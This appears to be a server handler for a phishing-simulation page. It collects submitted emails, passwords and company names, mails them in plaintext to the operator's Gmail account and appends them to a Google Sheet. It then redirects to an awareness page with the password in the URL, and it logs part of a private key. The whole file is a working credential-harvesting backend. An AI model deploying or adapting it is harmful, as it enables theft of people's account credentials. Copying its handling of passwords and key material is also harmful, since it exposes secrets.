import nodemailer from 'nodemailer';
import { google } from 'googleapis';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password, company } = req.body;
    const timestamp = new Date().toISOString();

    console.log('ENV CHECK:', {
      hasEmail: !!process.env.GOOGLE_CLIENT_EMAIL,
      hasKey: !!process.env.GOOGLE_PRIVATE_KEY,
      hasSheet: !!process.env.SHEET_ID,
      hasGmail: !!process.env.GMAIL_USER,
      hasGmailPass: !!process.env.GMAIL_APP_PASSWORD,
    });

    // --- Send Email ---
    try {
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.GMAIL_USER,
          pass: process.env.GMAIL_APP_PASSWORD,
        },
      });

      await transporter.sendMail({
        from: process.env.GMAIL_USER,
        to: process.env.GMAIL_USER,
        subject: 'New Phishing Test Submission',
        text: `Company: ${company}\nEmail: ${email}\nPassword: ${password}\nTime: ${timestamp}`,
      });
    } catch (emailErr) {
      console.error('Email error:', emailErr.message);
    }

    // --- Save to Google Sheet ---
    try {
      const privateKey = process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n');

      console.log('Private key start:', process.env.GOOGLE_PRIVATE_KEY?.substring(0, 50));
      console.log('Client email:', process.env.GOOGLE_CLIENT_EMAIL);

      const auth = new google.auth.GoogleAuth({
  credentials: {
    client_email: process.env.GOOGLE_CLIENT_EMAIL,
    private_key: privateKey,
  },
  scopes: ['https://www.googleapis.com/auth/spreadsheets'],
});

      const sheets = google.sheets({ version: 'v4', auth });

      await sheets.spreadsheets.values.append({
        spreadsheetId: process.env.SHEET_ID,
        range: 'Sheet1!A:D',
        valueInputOption: 'RAW',
        requestBody: {
          values: [[timestamp, company, email, password]],
        },
      });
    } catch (sheetErr) {
      console.error('Sheet error:', sheetErr.message);
    }

    // Always redirect no matter what
    res.redirect(302, `/awareness.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
  }
}